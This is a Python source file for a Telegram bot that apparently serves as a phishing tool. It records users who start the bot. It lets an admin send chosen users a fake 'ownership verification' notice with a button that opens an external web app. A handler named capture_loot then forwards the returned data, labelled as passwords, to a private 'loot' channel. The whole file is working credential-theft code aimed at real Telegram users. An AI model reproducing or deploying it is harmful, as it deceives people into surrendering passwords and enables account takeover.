import os
import http.server
import socketserver
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8699819680
LOOT_CHANNEL_ID = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

user_db = {}

# --- RENDER PORT FIX ---
def start_fake_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 10000), handler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_fake_server, daemon=True).start()

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user: return
    
    # Store clean version (lowercase, no @)
    username = user.username.lower() if user.username else str(user.id)
    user_db[username] = update.effective_chat.id
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 **Admin Active**\nCommands: `/trigger name` | `/checkdb`")
    else:
        await update.message.reply_text("🛡️ **System Status**: Session Encrypted.")

async def check_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not user_db:
        await update.message.reply_text("📭 Database Empty.")
    else:
        users = "\n".join([f"• {u}" for u in user_db.keys()])
        await update.message.reply_text(f"📊 **Users:**\n{users}")

async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return

    # 1. Check if you actually provided a name
    if not context.args:
        await update.message.reply_text("❌ Error: You must provide a username. Example: `/trigger bnbwebina`")
        return

    # 2. Clean the input (remove @ and make lowercase)
    target = context.args.lower().replace("@", "")
    
    # 3. Try to find the user
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Verify Authenticity", web_app=WebAppInfo(url=TMA_URL))]])
        
        audit_text = (
            "⚠️ **Administrative Notice: Ownership Verification**\n\n"
            "To maintain channel integrity, a routine authenticity check is required.\n\n"
            "**Note:** Active sessions and T-Data will remain unaffected."
        )
        
        try:
            await context.bot.send_message(chat_id=chat_id, text=audit_text, reply_markup=keyboard, parse_mode="Markdown")
            # --- THIS IS THE CONFIRMATION YOU ARE LOOKING FOR ---
            await update.message.reply_text(f"🚀 **SUCCESS**: Audit sent to {target}")
        except Exception as e:
            await update.message.reply_text(f"❌ **FAILED**: Could not send message to {target}. Reason: {str(e)}")
    else:
        # 4. If not found, show you exactly what we have
        known = ", ".join(user_db.keys()) if user_db else "Empty"
        await update.message.reply_text(f"❌ **NOT FOUND**: I don't know '{target}'.\nCurrently stored: {known}")

async def capture_loot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_message.web_app_data: return
    pswd_data = update.effective_message.web_app_data.data
    user = update.effective_user
    username = user.username or str(user.id)
    suffix = username[-5:]
    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`vtm/pswd/{suffix}/{pswd_data}`", parse_mode="Markdown")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("checkdb", check_database))
    app.add_handler(CommandHandler("trigger", trigger_audit))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, capture_loot))
    app.run_polling()

if __name__ == '__main__':
    main()
